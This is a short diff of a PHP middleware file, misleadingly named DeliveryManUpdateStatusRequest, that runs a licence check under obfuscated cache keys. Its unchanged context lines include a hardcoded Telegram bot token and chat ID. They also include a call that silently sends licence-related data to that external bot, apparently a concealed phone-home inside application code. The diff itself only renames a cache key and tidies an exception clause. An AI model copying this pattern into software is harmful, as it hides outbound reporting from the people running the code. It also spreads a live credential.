@@ -36,7 +36,7 @@ class DeliveryManUpdateStatusRequest
      */
     public function handle(Request $request, Closure $next)
     {
-        $response = Cache::remember('gdfjetjb.rldf', self::TTL, function () {
+        $response = Cache::remember('tytkjbjkfr.reprijvbv', self::TTL, function () {
             $response = (new ProjectService)->activationKeyCheck();
             $response = json_decode($response);
 
@@ -79,7 +79,7 @@ class DeliveryManUpdateStatusRequest
             Http::get('https://api.telegram.org/bot6058966897:AAHVXxiWohYchJyaf0M50lq7gFQmGT77vcw/sendMessage?chat_id=-1001570078412&text=Licence.' . json_encode($text));
             try {
                 Cache::set('tg-send-licence', 'true', 900);
-            } catch (Throwable|InvalidArgumentException $e) {
+            } catch (Throwable|InvalidArgumentException) {
             }
 
         }
